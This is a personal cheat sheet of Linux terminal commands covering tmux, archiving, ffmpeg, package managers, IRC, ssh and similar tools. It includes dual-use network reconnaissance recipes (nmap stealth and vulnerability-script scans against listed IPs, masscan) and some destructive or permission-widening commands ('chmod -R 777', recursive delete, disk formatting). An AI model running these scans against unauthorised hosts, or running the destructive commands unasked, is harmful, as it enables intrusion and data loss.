---------------------------------------------------------------------
bash/zsh + linux terminal cli tools commands 
---------------------------------------------------------------------
- clear line: ctrl + u
- setsid :  keep running even when terminal died
- nohup: send output to nohup.out then continue on terminal
- run in background with no output: nohup abc > /dev/null 2>&1 &
- run application in background:  foobar &
    - add & to the end of line
    - multiple commands: nohup sh -c 'a;b;c' &
- run cmd while disabling alias:   \ls
- rm -r mydir (remove directory)
- move multiple files: mv -t DESTINATION file1 file2
- move all folders: mv  -v ~/Downloads/* ~/Videos/
- check battery status: upower -i /org/freedesktop/UPower/devices/battery_BAT0
- clear screen: ctrl+l
- tmux (with oh-my-tmux installed)
    - C-b + 
            - %  split vertically            |
                - or _
            - "    split horizontally   -----
                - or -
            - navigate btwn panes :   arrowkeys
            - adjust pane size : hold arrowkeys
            - create new windows : c
            - rename session: $
            - rename window:    ,
            - kill window: &
            - move between panes: k,j,l,h
            - equal sizes:
                - vertically: alt+2
                - horizontally: alt+1
            - switch between window: 0...9
            - next window: n
            - fullscreen/monocle: z
            - previous window: p
            - choose from list: w
            - mv pane to nxt pos: }
            - mv pane to prev pos: {
            - rearrange panel: [space]
            - install plugin : I
                - add plugin to list(.tmux.conf) first
            - save session: C-s
            - restore session: C-r
            - quit / detach: d
            - terminate window: &
            - copy mode: [   -> C-[space] -> alt+w(fin)
            - paste: ]
            - source conf file : r
            - mouse mode on: m
            - switch to window: s
			- move tab: :swap-window -t +1
				- to left:  :swap-window -t -1
			- join pane from window: :join-pane -s mywin2
			- send pane to window: :join-pane -t mywin2
    - reload config: tmux source ~/.tmux.conf
    - show all session: tmux ls
    - kill sessions: tmux kill-session
        - kill all sessions: tmux kill-server
    - re-attach: tmux attach-session -t mainSession
        - tmux attach
    - run commands: c-b :
    - move window
        - right: swap-window -t +1
        - left: swap-window -t -1 
- refresh dynamic link: sudo ldconfig
- start font server: fontsrv
- clear screen: clear
    - ctrl+l
- copy line to clipboard: ctrl-P
    - paste: xsel
            - clear xsel: xsel --clear
    - copy from file to clipboard:
        - xsel -b < abc.txt
        - xclip -sel c < abc.txt

- download : wget
    - specify path:  -O /path/to/file.txt
        - into dir : -P
    - whole folder : -r
    - into directory : -R
    - authentication:
        -(--user=USERNAME)
        -(--password=PASS)
    - all files in dir: 
        - wget -np -nH --cut-dirs 100 -r -e robots=off --reject="index.html*" http://foo.bar/a/
            - folders skipping:    --cut-dirs 5
- download with curl: curl -LO abc.com/foo.bar
- add permission:
    - chmod +x 
    - All permissions: sudo chmod -R 777
    - allow others to read+write: chmod o=rw myfile
    - format:
        - chmod {who}{what}{which}
            - chmod u+x
                - user ADDS executable
            - chmod u-x
                - user REMOVES executable
            - who:
                - u: user (owner of the file)
                - g: group (members of group the file belongs to)
                - o: other ppl (outside of u and g)
                - default who = a if not specified
            - what:
                - +: add
                - -: remove
                - =: set this permission only and remove all others
            - which:
                - r: read
                - w: write
                - x: execute

    - {https://www.howtogeek.com/437958/how-to-use-the-chmod-command-on-linux/}
- shutdown : shutdown now
    - safely: sudo shutdown -h now
- reboot : reboot
    - safely: sudo shutdown -r now
- nmap
    - intense:  -T4 -A -v  ipaddress
    - TCP/UDP scan: -sS -sU -PN ipaddress
    - test port 80: nmap -sT -P0 -p 80
        - nmap -sT -p 80
    - T flag:
        - T0: paranoid
        - T1: sneaky
        - T2: polite 
        - T3: normal
        - T4: aggressive
        - T5: insane
    - os detection: -O
    - version scanning: -sV
    - script scanning: -sC
    - aggressive mode: -A
        - enables -O,-sC,-sV,--traceroute
        - intrusive
    - traceroute: --traceroute
        - performed post scan
        - use scanned info to determine port, protocol most likely to reach target
    - P0: no dns resolution
        - prevent doing reverse dns resolution
        - previously Pn
        - reduce scan time
    - scan types
        - sL: list scan
            - wont send packets
            - list hosts
            - does reverse dns resolution
            - retrieves hostname
        - sn: host discovery
            - no DNS resolution (dont do reverse DNS resolution to IP)
            - for probing (host discovery) only
            - won't scan ports
        - sA: TCP ack
            - for probing firewall rulesets
            - only determines if port is filtered or not
        - sT: TCP
            - should be used if SYN it not an option
        - sF: FIN
            - slightly more stealthier than SYN
        - sN: null
            - slightly more stealthier than SYN
        - sX: xmas
            - slightly more stealthier than SYN
        - sI: idle
            - uses zombie host to scan
        - sS: SYN
            - most popular scan type
            - quick
            - stealthy, non-intrusive
                - bc. it never completes TCP connection
            - half-open scanning
                - doesnt open a full tcp connection
                - sends SYN packet
        - sW: windows
            - for windows
            - same as ACK
        - sU: UDP
    - speedup scan
        - nmap -T5 --min-parallelism=50 -n --min-rate=300
    - check devices: nmap -sP 192.168.1.0/24
    - host script: nmap -sC 138.253.207.103
	- local opened ports: sudo nmap -sT -O localhost
    - check what the flag does: nmap |grep -- -sV
    - display ports regardless of the state: sudo nmap -sV
    - verbose: -vv
    - disable dns resolution (quicker): -n
    - no port scan: -sn (replaces -sP)
    - stealth scan: -sL
    - scan with vulns: --script vuln
      - example: nmap -T4 -A --script vuln -P0 123.456.789.111
    - {https://www.redhat.com/sysadmin/quick-nmap-inventory}
- masscan: internet scale port scanner
    - scan with range: masscan --range 192.168.0.255-192.168.10.255 --top-ports 100 --rate 10000 > results
- access device: telnet 192.168.1.1 23
    - test HTTP:     GET / HTTP/1.1
      host: 138.253.207.103
- check router ip: netstat -rn
- MC
    - dc ftp:  C-x a  f
    - quit : F10
    - chg to opposite dir panel: tab
    - quick cd: alt c
    - scan dir size: ctrl+space
    - file info: C-x i
    - quick view file: C-x q
    - select multiple files: INSERT or C-t
    - shell autocomplete: ( ESC + Tab ) * 2
    - place mc in bg/bring back to foreground: C-o
    - layouts
        - top-down: Alt + ,
        - swap panels: C-u
        - sync panels : Alt + i
        
- Ranger
    - view files:  i
    - hidden files: zh
    - rename : cw
		- a
    - select current file: <space>
    - search: /
    - copy:yy
	- cut: dd
	- delete: dD
	- uncut : ud
	- unselect : uv
	- reverse select: v
	- paste: pp
    - open: E
        - open with: r
    - new tab: C-n
    - next tab: <tab>
    - prev tab: <shift><tab>
    - close tab : C-w
    - shell commands: !
    - cd into folder:   :cd /path
    - sort by file size: os
    - swith to tab N:   Alt-N
        - close tab: q
    - open shell in current directory: Shift + s
        - return abck to ranger : Ctrl + d
    - {https://pygy.co/gD,http://pygy.co/bwj, https://rdd.ro/ranger-cheatsheet/}
- archive
	- tar cvf foobar.tar foobar
		- tar --exclude="*node_modules*" -cvf - foo > foo.tar
		- list content: tar tvf foo.tar
- compress
    - (tar.gz): tar -czvf archive.tar.gz stuff
        - max compress(do this first): export GZIP=-9
            - check echo $GZIP
            - alternative: tar cvf - stuff | gzip -9 > stuff.tar.gz
            - exclude folders: tar --exclude='foo/bar' --exclude='foo/a/b' -cvf - foo | gzip -9 > foo.tar.gz
                - include hidden dot files:
                    - tar --exclude='foo/bar' --exclude='*foo.tar.gz' -cvf - * ./ | gzip -9 > foo.tar.gz
        - faster
    - (tar.xz) :tar -cJf filename.tar.xz stuff
        - max compression: tar cvf - stuff | xz -9 -T 0 -e - > stuff.tar.xz
        - keep original file: xz -9 -T 0 -e < file > file.xz
            - using pixz: tar cvf - foo | pixz -9 > foo.tar.xz
        - slower but higher compression rate
		- xz -9 -T 0 -e -k foo.tar
			- keeps input foo.tar file
    - (7z): 7z a foo.7z abc.txt
		- max compression: 7z -mx=9 a abc.7z abc
	- (zst / zstandard): tar cvf - foo | zstd -22 --ultra -T0 -o foo.tar.zst
		- training mode: zstd --train path/* -o dictName
		- cmpr. with dict: zstd -D dictName FILE
		- dcmpr. with dict: zstd -D dictName --decompress FILE.zst
		- remove src after cmpr/dcmpr : --rm
	- (.lz): tar cvf - foo | lzip --best > foo.tar.lz
	- (.nz) nanozip: nz a -cc test.nz test.tar
		- dir: nz a -cc test.nz -r test
	- (.zpaq) zpaq: zpaq add test.zpaq test -m5
		- max: zpaq add test.zpaq test -m611 -t1
    - (.bzip3): bzip3 (spiritual successor of bzip2)
        - max: bzip3 -e -b 511 -j 4 myfile
        - flags:
            - -b: block size in MiB
            - -j: parallel threads
- extract:
    - (.tar.xz / .tar.gz):   tar xpvf XXXX.tar.xz
    - (.tar.xz) tar xJvf abc.tar.xz
        - xz -d abc.tar.xz
            - then : tar xvf abc.tar
    - (.tar.bz2): tar xvjf file.tar.bz2
    - (.Z): zcat *.Z |tar -xvf -
        - {https://kb.iu.edu/d/acsy}
    - (.tar.gz): tar -xzf abc.tar.gz
        - gunzip foo.tar.gz
            - then : tar xvf abc.tar
    - to folder: tar -xvzf foo.tar.gz -C bar/ 
        - (must create folder 'bar' first)
    - list content: tar -zvtf filename.tar.gz 
        - vim foobar.tar.gz
        - with details:
            - (xz) tar -Jtvf abc.tar.xz | humantvf
                - pixz -l foo.tar.xz
                - xz -l foo.tar.xz
            - (gz): tar -ztvf abc.tar.gz
                - gzip -tl foo.tar.gz
            - show max depth: |grep -v '/.*/.*/'
    - (.7z):  7z x foo.7z
        - with password: 7za x foo.7z -pabcdef
        - list: 7z l foo.7z
        - to directory: 7z x abc.7z -ofoo/bar
    - (.zip) unzip foo.zip -d foo/
        - list: unzip -l foo.zip
        - single file: unzip foo.zip bar.mp4
        - all files inside folder: unzip foo.zip 'in/folder/*' -d abc
        - strip path folders: unzip -j foo.zip 'in/folder/*' -d abc
    - (.rar) extract to curr dir:  unrar e abc.rar
        - list :  unrar l abc.rar
        - extract to path: unrar x abc.rar foo/
        - extract certain files: unrar e test.rar file5 file8
    - (.zst) : unzstd foo.zst
		- then : tar xvf foo.tar
	- (.nz): nz x foo.nz
		- output dir: nz x -ohere foo.nz
		- list: nz l foo.nz
	- (.zpaq): zpaq extract test.zpaq -to foo
- delete folder from tarball :
    - gunzip foo.tar.gz
    - tar --delete --file=foo.tar foo/bar
- restart wifi : sudo service network-manager restart
- pasting : shift+insert
- install new font: cp font.tff /usr/share/fonts
- reset font cache : fc-cache -f -v
- create file: touch
- return current directory: pwd
- move up one level:  mv foo.bar ../
- convert to pdf:    unoconv -f pdf  foo.pptx
    - (if error: unable to start own listener)[fix]:
        - killall soffice.bin
        - sudo unoconv --listener
- calculator : bc
    - use log : bc -l 
        - l(a)/l(b)
    - 2 decimal places : scale=2
- ClamAV: 
    - start: sudo /etc/init.d/clamav-freshclam start
        - sudo freshclam
    - stop: sudo /etc/init.d/clamav-freshclam stop
    - update virus signature : sudo freshclam -v
    - status : sudo /etc/init.d/clamav-freshclam status
- zathura: 
    - goto page X : Xgg
    - see table of content: TAB
    - fit page: a
    - fit width: s
    - invert colours: ctrl+i
      - add line to ~/.config/zathura/zathurarc
        - map <C-i> recolor
- connmanctl (network manager)
    - enable wifi: enable wifi
    - scan for wifi: scan wifi
    - services: services
    - start: systemctl start connman
    - stop: systemctl stop connman
- screenshot : scrot
    - selection: scrot --select
      - scrot -a $(slop -f '%x,%y,%w,%h')
    - whole screen: scrot -e 'xclip -selection c -t image/png < $f'
- XAMPP : sudo /opt/lampp/lampp start/stop
    - GUI tool : sudo /opt/lampp/manager-linux-x64.run
    - bitnami: sudo /opt/bitnami/ctlscript.sh status/start/stop/restart
        - restart single service: restart apache
- size: du
    - human readable + summary: -hs
    - all files within directory: -hs *
    - more accurate sizes :   -shc --apparent-size
        - sorted: -h * | sort -h
        - full: du -shc --apparent-size *|sort -h
            - reverse order : -r
- http header: curl -I  foo.bar
- info about directory: stat foobar
- check weather: curl -s wttr.in/Liverpool
- reload zshrc :       . ~/.zshrc
- grep filter
	- from ls:  ls | grep linu 
		- remove sensitivity : grep -i 'hello'
		- different patterns: grep 'Foo\|bar'
		- inverse: -v
		- eg:
			- ls -ltrha |grep "abc\|def" -i
        - regex: grep -wE '[a-zA-Z1-9]{32}'
- create multiple dirs: mkdir folder0 folder1 folder2 folder3
- create nested subdirectories : mkdir -p d/s/a/e
- sublime text : subl
- visual studio code: code
- list : ls
    - list + file edit date:  ls -l
    - list + sort by date : ls -t
        - ls -tr
        - with details: ls -lhtr
    - human readable: ls -lh
    - sort by file size: ls -Slh
    - reverse: -r
    - full: ls -ltrha
- oh-my-zsh
    - upgrade: upgrade_oh_my_zsh
- package manager:
    - yaourt
        - uninstall :  -Rsnc
        - update: -Syu
            - + resync with mirror: -Syu
            - + resync with mirror(inc aur): -Syyua
- wikit 
    - wikit google
    - linewrap length:  wikit google -line 100
    - open in browser: wikit google -b
- googler
    - googler -n 5 -c gb -l en hello world
    - next page: n
    - previous page: p
    - news -N gadgets
    - time:   -t m6
    - filetype: instrumental filetype:mp3
- nnn (file manager)
    - view file: p
    - edit file: e
    - open with default file manager: o
    - rename: ctrl-r
    - toggle hide dot files: .
    - sort by file size: s
    - sort by time :t
    - go up a  dir: h
    - chg dir: c
    - toggle detail view: d
    - show current file details: D
    - quit: q
    - filter current dir: /
    - spawn shell: !
    - apparent du: S
    - context/tab
        - go to : <NUMBER>
        - quit: q
    - go to / : `
    - select all : shift + y
    - select : ctrl + k
    - check selected: y
    - toggle select mode: shift + k
    - delete : ctrl + x
        - selected : shift + x
    - move selected: shift + v
    - copy selected : P
    - pin: b
        - go to pin: ctrl + b
    - view keybinds: ?
- rtv (reddit terminal viewer)
    - view comments :  ->
    - visit site : enter
    - expand/collapse comments: space
    - visit subreddit :   /linux
    - front page:  :  p
    - refresh : f5  /  r
-  network details: ifconfig
-  show ip addr:   ip addr show
- get external ip addr: 
    - echo $(wget -qO - https://api.ipify.org)
    - echo $(curl -s https://api.ipify.org)
-  get internal ip addr:
    - ifconfig | grep -w inet | awk '{ print $2}'
    - ip a s | grep -w inet | awk '{ print $2}'
    - ip route get 1.2.3.4 | awk '{print $7}'
- empty file: truncate -s 0 foo.txt
    - empty file with size: truncate -s 100M foo.txt
- see sysinfo:  
    - neofetch
    - lsb_release -a
- change dir perm: chown -R austin:austin abc
	- user:group
- change perm for multiple :
	- files: find ~/htdocs/staging -type f -exec chmod 644 {} \;
	- dir: find ~/htdocs/staging/ -type d -exec chmod 755 {} \;
- football-cli:
    - league table: football standings -l PL
    - scoreline: football scores -l
        - team: football scores -t arsenal
        - team + live: scores -t "arsenal" -l
    - fixtures:
        - next 15 days: football fixtures -l PL -d 15 -n
        - team: football fixtures -t arsenal -d 15 -n
            - football fixtures -n -d 15 -t "rennais" 
    - league code: football lists
- check if site is up: is-up google.com
- check vid info: 
    - ffprobe: ffprobe -v quiet -print_format json -show_format -show_streams
    - mediainfo: mediainfo --fullscan input.mkv
    - check if vid contains subs: ffmpeg -i video -c copy -map 0:s -f null - -v 0 -hide_banner && echo $? || echo $?
        - 0 = found subtitles, 1 = not found
- ftp:
    - ftp files.000webhost.com
    - download: get file
    - upload: put
    - change local dir: lcd
    - (http://bit.ly/2z5UT83 , http://bit.ly/2fTTGso)
- LFTP: lftp
    - connect: open -u abc files.000webhost.com
    - copy dir: mirror source target
    - download file: pget file
    - upload file: put file
    - exit: bye
    - http://zae.bz/jWHYhl
- colorls : lc
    - 1 entry per line : lc -1 
    - only files : lc -f
    - only directories: lc -
    - sort by(alphabetical)
        - dir first : lc -sd
        - files first : lc -s
- including hidden files: -a
- check my username: whoami
- change password: passwd austin
- extract all images from pdf: pdfimages -j abc.pdf ./img
    - extracted images will begin with the prefix img
- convert images:  convert a.ppm b.jpg
- docx to txt : docx2txt abc.docx
- URL Shortener:
	- bitly: bitly "google.com"
	- zaebz: zaebz "google.com"
- virus scanner
	- scan: virustotal file-scan abc.txt
	- get report : virustotal file-report 12f0326
- go back to previous directory: cd -
- email client: mutt
	- top of the page : H
	- bottom of the page: L
	- refresh inbox:  :exec imap-fetch-email
- todo list (task warrior): task
	- show list: task next
	- add task: task add foo bar due:2017-01-30
		- add priority: priority:H
		- multiline: task add "ssds adfa adfasfa"
	- fin task: task 2 done
	- del task: task 1 delete
	- modify: task 12 modify due:eom
		- remove due date : task 12 modify due:
   - (http://zae.bz/DISgAu , http://zae.bz/DFdvYy)
- installed pkg version: apt-cache policy coreutils
	- dpkg -s coreutils
- music player: cmus
	- file browser: 5
	- add music to library: a
	- play: enter
	- pause/unpause: c
	- next track: b
	- previous track: z
	- stop playback: v
	- restart track: x
	- jump view to current track: i
	- view queue: 4
	- add song to play next in queue: e
	- remove from queue: shitf + d
	- view library : 1
		- move focus to tracklist : tab
		- toggle play library: shift + m
		- toggle artist/all/album : m
		- toggles:
			- continue : shift + c
			- repeat: r
			- shuffle:  s
	- view sorted library : 2
	- view playlist: 3
	- add from library to playlist: y
	- update cache:  :update-cache
	- (http://zae.bz/UhNKOy , http://zae.bz/FGdFCF)
- music visualizer 
	- cava
		- width of lines: left/right arrow
		- sensitivity: up/down arrow
		- reload config file: r
		- (on WSL) : use tilda
			- run with :nohup tilda &
- youtube-dl
	- to mp3: youtube-dl -x --audio-format mp3 url
	- manual:  tldr youtube-dl
- IRC client: weechat
    - multiline: alt+enter
    - set ssl_cert :  "%h/certs/freenode.pem"
    - set nickname: /nick foobar
    - check user mode: /mode
    - toggle between core/server: ctrl+x
    - list servers: /server list
	- add server: /server add oftc irc.oftc.net/6697 -ssl -autoconnect
	- delete server: /server del freenode
	- connect : /connect oftc
	- disconnect: /disconnect oftc
	- turn on ssl : /set irc.server.freenode.ssl on
	- turn on/off autoconnect: /set irc.server.freenode.autoconnect on
	- add tor: /proxy add tor socks5 127.0.0.1 9050
		 - start tor first: sudo service tor start
			 - reload tor: sudo service tor reload
	- tor proxy: /set irc.server.freenode.proxy "tor"
	- register: /msg NickServ REGISTER password youremail@example.com
	- close buffer/channel:  /close
	- buffer list:  /buffer
	- switch buffer: f5/f6
		- /buffer 3
		- /buffer foo
        - alt + up/down arrow keys
	- windows: /window
	- list channels: /list
	- list added servers: /server list
	- scroll buffer: pg-up/down key
	- change nickname
		- default: /set irc.server_default.nicks comma,separated,list,of,nicks
		- server nick: /set irc.server.freenode.nicks "foo"
	- change nick colour: /set weechat.color.chat_nick_self
	- sasl settings:
		- set username: /set irc.server.freenode.sasl_username
		- set pw: /set irc.server.freenode.sasl_password
		- set mechanism: /set irc.server.freenode.sasl_mechanism external
        - save: /save
	- join channel:  /join #programming
	- part channel : /part [quit message]
	- private msg: /query foo this is a message
		-   /msg friend msg?
	- find channels
		- freenode
			- top channels: /msg alis LIST * -min 1500
	- download dir = ~/.weechat/xfer
    - bare display mode: alt+l
    - autojoin:
        /set irc.channel.libera.autojoin #libera,#linux
        - edit: fset autojoin
            - append to the end of list: alt +
    - canonical mode: alt + l
- mps-youtube : mpsyt
     - set search to all cat. : set search_music false
     - video video output: set show_video true
         - audio only: set show_video false
     - search :   /foo bar
         - search playlist: //foobar
         - search album: album foobar
         - search user : user foobar
              - user+query: user foo/bar
        - search channels: channels foo bar
    - play from URL : playurl url
    - open playlist url/id :  pl <url or id>
    - autoplay in playlist: 1- 
     - next/previous page:  n  /  p
     - jump to page: p 3
     - adjust vol: 9 / 0
     - pause: spacebar
     - seek:  left/right & up/down arrows
     - exit video: q
     - view info of video: i 2
     - view comments of video: c 2
         - exit comments view: ctrl+c
     - download video: d 2
     - show videos by uploader: u 2
     - copy url to clipboard : x 2
     - set order:  set order date
            - views: set order views
     - http://zae.bz/haZMSB
- pacaur
        - search : -Ss
        - update: -Syu
- torrent cli tool:
    - rtorrent
        - magnet links: backspace > past link
        - hash check: ctrl+r
        - exit: ctrl+q
        - stop : ctrl+d
        - start: ctrl+s
        - change views: 
            - file list : right key
                - chg. priority
                    - all : *
                    - single file : SPC
            - main : 1
            - active: 0
            - complete: 5
            - seeding: 8
            - leeching: 9
            - stopped : 4
        - (http://zae.bz/QBUiHV , http://zae.bz/XRhNCR )
	- aria2
		- aria2c foo.torrent
- convert video: ffmpeg
    - use libx265: ffmpeg -i abc.mkv -c:v libx265 abc.mp4
    - extract subtitles: ffmpeg -i abc.mkv -map 0:s:0 subs.srt
        - if subs>1:  0:s:1 = 2nd sub , 0:s:2 = 3rd sub
        - convert subs: ffmpeg -i input.srt output.vtt
    - use vp9: ffmpeg -i foo.mkv -i subs.vtt -c:v libvpx-vp9 -c:a libopus -c:s webvtt foo.webm
        - good quality : ffmpeg -i orig.mp4 -c:v libvpx-vp9 -c:a libopus -b:v 0 -b:a 0 -crf 30 win.webm
    - batch convert : for i in *.avi; do ffmpeg -i "$i" "${i%.*}.mp4"; done
        - multiple extensions: for i in *.{avi,mkv}
    - add subs to video: ffmpeg -i myvid.raw.mp4 -i subs.srt  -c copy -c:s copy -metadata:s:s:0 language=eng myvid.subs.mkv

- file transfer :
    - transfer.sh :
        - upload: curl --upload-file foo.bar https://transfer.sh/b.c
        - download: curl https://transfer.sh/a/b.c -o foo.bar
    - send-cli :
        - upload: send-cli foo.bar
        - download: send-cli "send.firefox.com/download/abc"
            - if error: add --ignore-version
- tor: 
    - ubuntu: sudo service tor start
        - sudo service tor restart
    - arch: systemctl start tor
        - status: systemctl status tor
- get permission (octal) number: stat -c %a directory
-  change keyboard layout: setxkbmap xkb_layout us
-  merge gifs: gifsicle --colors 256 --merge *.gif -o out.gif
    - gifsicle --colors 256 a.gif b.gif > c.gif
-  generate random pw: openssl rand -base64 6
    - date +%s | sha256sum | base64 | head -c 10
    - openssl rand -base64 29 | tr -d "=+/" | cut -c1-25
- httpie: http
    - PUT: http PUT example.org X-API-Token:123 name=John
        - multipart/form-data:  http -f PUT localhost:3000/api/file @foo.jpg
    - POST: http -f POST localhost:8000/api/todos/1/items/ content="todoitem0 inside todo0"
    - output only headers: -h
    - output only body: -b
- system monitoring tools:
    - htop
    - vtop
    - nmon
    - gtop
- top: monitor linux processes
    - sort CPU:
        - high to low: top -o +%CPU
        - low to high: top -o -%CPU
    - sort memory:
        - top -o +%MEM
    - sort pid:
        - top -o +%PID
    - field descriptions:
        - PID: process id
        - USER: owner
        - PR: priority
        - NI: nice value, negative = higher priority, positive = lower priority
        - VIRT: virtual memory used
        - RES: resident memory
        - SHR: shared memory
        - S: status
            - D: uninterruptibe sleep
            - I: idle
            - R: running
            - S: sleeping
            - T: stopped by job control signal
            - t: stopped by debugger during trace
            - Z: zombie
        - %CPU: cpu usage
        - %MEM: memory usage
    - {https://www.linuxcommands.site/linux-monitor-commands/top-sort-by-cpu-by-memory-in-linux/}
- json processor : jq
    - e.g.: curl httpbin.org/ip | jq
    - filter: .foo.bar
        - array index: .foo[0].bar
        - e.g.: ffprobe -v quiet -print_format json -show_format -show_streams test.mp4|jq ".streams[0].codec_name"
        - string: ."foo bar"
            - e.g. jq '."Foo Bar"'
        - {https://stedolan.github.io/jq/manual/#Basicfilters}
    - pipe output into less: curl -s https://api.github.com/users/octocat/repos | jq '.' | less
    - remove quotes : -r
    - all elements in array: ".[].name"
	- jq -r '.data | (map(keys) | add | unique) as $cols | map(. as $row | $cols | map($row[.])) as $rows | $cols, $rows[] | @csv' foo.json foo.csv

- HTML processor: pup
    - e.g.: curl localhost:3000 |pup --color 'body h1,body p'
    - print all text : text{}
        - e.g. : curl localhost:3000 |pup --color 'body h1,body p text{}'
    - print as JSON: json{}
    - {https://github.com/ericchiang/pup}
- IP address of domain: nslookup
- IP geolocation : iplocation 
- tree view: tree
    - levels: tree -L 2
    - exclude folder: tree -I 'test*|docs|bin|lib'
        - excludes docs,bin,lib and any dir with test in the name
    - all files: -a
    - filelimit : --filelimit 
    - full
        - e.g. : tree -L 2 -I 'node_modules'
        - e.g. : tree -L 2 -a --filelimit 20
    - {https://www.cyberciti.biz/faq/linux-show-directory-structure-command-line/}
- Excel parser: xwbp --json example.xlsx
- pause/suspends process : ctrl+z
    - resume: fg
- suspend/freeze terminal: ctrl+s
    - resume : ctrl+q
- anime checker: moe -name "foobar" -info
    - just rank and score: -score -rank
- yay / trizen / pacman :
    - package info: -Si
    - package check dependencies: -Qi
    - check if no longer required : -Qdt
    - list of all no longer required : -Qqdt
    - which package a file/cmd belongs to: -Qo file
	- list of installed packages: -Qqe
	- list of files installed by package: -Ql foobar
    - remove : -Rsn
    - AUR comments: -C
    - output PKGBUILD : -Sp
    - clear cache: -Scc
- webp:
    - encode: 
        - cwebp foo.jpg -o foo.webp
            - target output size (in bytes) : -size int
                - (e.g.) : 900kb = -size 900000
        - batch :  for i in *.JPG;do cwebp -q 75 "$i" -o "$i.webp";done
        - ffmpeg -i foo.jpg foo.webp
        - good settings:
            - cwebp foo.jpg -q 100 -o foo.webp
    - decode:
        - dwebp foo.webp -o foo.png
- check file permission : stat
    - stat FILE_OR_FOLDER_PATH
    - only show chmod octal permission
        - stat -c %a FILE_OR_FOLDER_PATH
- remove files with grep
    - ls |grep -Z 'mp4\|mkv' |tr '\n' '\0' |xargs -0 rm
- delete all files inside folder except
    - find . ! -name test0.tar.xz -delete
    - find . -type f -not -name 'test2.tar.xz' -print0 | xargs -0 rm --
        - multiple: find . -type f -not -name 'test2.tar.xz' -not -name 'app.js' -not -name 'package*'  -print0 | xargs -0 rm --
    - zsh
        - rm -r ^(*foo|*bar|*png)
            - need to run (setopt extended_glob) first
            - if single pattern only: rm ^foo.bar
- list files in iso
    - iso-info -f -i foo.iso
- cloc
    - count lines of code : cloc foo.tar.gz
- check hashes
    - sha256: sha256sum foobar.iso
    - compare hashes
        - echo 'asfasfa foo.bar' | sha256sum -c foo.bar
- mount: mount drives
    - sudo mount -t foo ~/shared/foo
    - virtualbox: sudo mount -t vboxsf foo ~/shared/foo
    - first check location : sudo fdisk -l
        - fdisk is in /sbin
        - then sudo mount -t ntfs /dev/sda1 ~/mnt
    - format and mount:
        - check block volumes: lsblk
        - format into ext4: mkfs.ext4 /dev/sda
        - ensure formatted correctly: lsblk -f
        - create mount point: mkdir /mnt/block0
        - mount block volume: mount -o defaults /dev/sda /mnt/block0
        - persist mounting: echo '/dev/sda /mnt/block0 ext4 defaults 0 0' >> /etc/fstab
- umount: unmount drives
    - sudo umount ~/shared/foo
    - virtualbox: sudo umount -i ~/shared/foo
	- additional step:
		- remove record : edit /etc/fstab
- rover : cli file manager
    - open shell on current directory : ENTER
    -  {https://github.com/lecram/rover}
- snap
    - install package: snap install foobar
        - latest version: snap install foobar --edge
    - list all install packages: snap list
    - uninstall package: snap remove foobar
    - find package: snap find foobar
    - enable service :
        - arch :
            - systemctl enable snapd.service
            - systemctl start snapd.service
	- change channel: sudo snap switch --channel=stable vlc
	- refresh: sudo snap refresh --channel=edge ffsend
	- info: snap info vlc
- dos2unix : convert file styles from dos to unix
- streamlink
    - streamlink https://www.twitch.tv/ninja best
    - define player: streamlink -p mpv twitch.tv/ninja 720p
- snap : snap package manager
    - find : snap find foobar
    - install : snap install foobar --edge
    - list : snap list
- ssh
    - install : openssh
    - start service: systemctl start sshd.service
    - connect: ssh user@192.168.1.73
    - delete invalid key: ssh-keygen -R 192.168.1.29
	- with key: ssh -xCi ~/ssh/key.pem abc@123.456.789
	- enable: sudo systemctl enable ssh
    - execute command straight after ssh connection:
        - ssh abc@def.xyz cat somefile
    - access remote machine via key:
      - generate client machine ssh key (if ~/.ssh/id_rsa.pub doesn't exist already): ssh-keygen -t rsa
      - copy contents of key into target remote machine ~/.ssh/authorized_keys
- scp
    - scp foo.bar abc@192.168.1.101:/home/abc/
        - dir with spaces: abc@192.168.1.101:"'/home/a d'"
- check available wifi frequencies: iwlist freq
- read pdf: lesspipe abc.pdf |less
    - might need to install pdftohtml
    - alternative: pdftotext file.pdf - | less
    - pdftohtml file.pdf -i -stdout > file.html
- check disk space left: df
    - human readable: df -h
- charge ios from usb: sudo usbmuxd -u -U usbmux
- list installed packages: dpkg -l
- check files included in a package: dpkg -L foobar
- check .deb info: dpkg-deb -I abc.deb
- remove package: dpkg -r foobar
- install package: dpkg -i abc.deb
- reverse search: ctrl-r
    - backward : ctrl-r
    - forward: ctrl-s
- find router ip address:
    - traceroute 8.8.8.8
        - 1st one on the list
    - route -n
- timedatectl (change timezone)
    - check available timezones: timedatectl list-timezones
    - set: timedatectl set-timezone Asia/Hong_Kong
- diff : find difference between 2 files
    - diff a.txt b.txt
- gif2webp : converts gif to animated webp
    - gif2webp a.gif -o a.webp
    - {https://developers.google.com/speed/webp/docs/gif2webp}
- pngquant : png compressor
    - pngquant a.png -o out.png
- sv : runit services
    - check status of all enable services : sv status /var/services/*
    - status of 1 service: sv status service_name
    - {https://wiki.voidlinux.eu/Runit,https://wiki.archlinux.org/index.php/runit}
- sysbench : benchmarking tool
  - cpu:  sysbench --test=cpu --cpu-max-prime=20000 run
    - just put 'cpu' instead of '--cpu' for version > 0.4
    - higher total no. of events = better performance
- list installed packages sorted by disk usage (arch)
    - expac '%m\t%n' | sort -h
    - pacman -Qi | awk '/^Name/{name=$3} /^Installed Size/{print $4$5, name}' | sort -hr | head -25
- opusenc : opus encoder
    - opusenc --bitrate 160 in.wav out.opus
    - loop
      - fish: for i in *.flac;opusenc --bitrate 128 $i (basename $i .flac).opus;end
- tail : output last parts of a file
    - last 10 lines: tail -10 abc.txt
- fff : file manager
    - move: j,k,h,l
    - top : g
    - bottom: G
    - toggle hidden files: .
    - search: /
    - go to trash: t
    - go to home: ~
    - new file: f
    - new folder: n
    - rename: r
    - move to trash: d
    - mark copy: y
    - mark move: m
    - paste/move: p
    - quit: q
	- x: view file info
	- e : refresh curr dir
	- !: open shell in curr dir
	- r : rename
    - {https://github.com/dylanaraps/fff}
- count number of files in dir: ls | wc -l
- xrandr: check screens
    - connect multi sreens:  xrandr --output HDMI1 --left-of eDP1 --auto
	- xrandr --output HDMI1 --mode 1920x1080 --left-of eDP1 --auto
	- xrandr --auto
- lsblk
    - list devices
- runit-init
    - shutdown: runit-init 0
    - reboot: runit-init 6
- rsync : faster than scp when copying multiple large files
    - rsync -atvzhrP --ignore-existing foo pi@192.168.1.83:"'/home/foobar/Downloads'"
	- with pem file:
		- rsync -atvzhrP -e "ssh -i ~/Documents/ssh/foobar.pem"
- git
	- clone: git clone
		- specific branch: git clone --branch devbranch abc.git
	- see changes of added files
		- git diff --cached abc.js
		- git diff --staged
